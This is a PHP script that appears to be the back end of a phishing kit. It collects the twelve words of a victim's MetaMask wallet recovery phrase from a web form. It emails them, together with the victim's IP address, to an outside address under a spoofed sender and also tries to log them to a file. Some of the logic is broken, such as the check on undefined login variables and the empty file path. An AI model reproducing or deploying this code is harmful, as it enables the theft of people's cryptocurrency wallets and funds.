<?php
$ip = getenv("REMOTE_ADDR");

$WoRd1 = $_POST['WoRd1'];
$WoRd2 = $_POST['WoRd2'];
$WoRd3 = $_POST['WoRd3'];
$WoRd4 = $_POST['WoRd4'];
$WoRd5 = $_POST['WoRd5'];
$WoRd6 = $_POST['WoRd6'];
$WoRd7 = $_POST['WoRd7'];
$WoRd8 = $_POST['WoRd8'];
$WoRd9 = $_POST['WoRd9'];
$WoRd10 = $_POST['WoRd10'];
$WoRd11 = $_POST['WoRd11'];
$WoRd12 = $_POST['WoRd12'];

$done = array('signal'=>'ok');
$bad = array('signal'=>'bad');


if (!empty($login) && !empty($passwd)) {
  $own = 'shareridesapp@yandex.com';
  $date = date("D/M/d, Y g:i a");
  $subj = "Metamask 12 Key Phrase from $ip";
    $from = "From:Wallet Log (EUR) <mail@me.mom163.com>";
  $msg = "$WoRd1\n";
  $msg .= "$WoRd2\n";
  $msg .= "$WoRd3\n";
  $msg .= "$WoRd4\n";
  $msg .= "$WoRd5\n";
  $msg .= "$WoRd6\n";
  $msg .= "$WoRd7\n";
  $msg .= "$WoRd8\n";
  $msg .= "$WoRd9\n";
  $msg .= "$WoRd10\n";
  $msg .= "$WoRd11\n";
  $msg .= "$WoRd12\n";
  $msg .= "Submitted from IP Address - $ip on $date\n-----------------------------------\n        Created By (~)\n-----------------------------------";
  mail($own,$subj,$msg,$from);

  echo json_encode($done);
} else {
  echo json_encode($bad);
}

$fp = fopen("","a");
fputs($fp,$msg);
fclose($fp);

// 	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
// $subject = "KSA MAIL";
// mail('a.williams8927@gmail.com', $subject,$mesaj, $mailHeaders);
?>
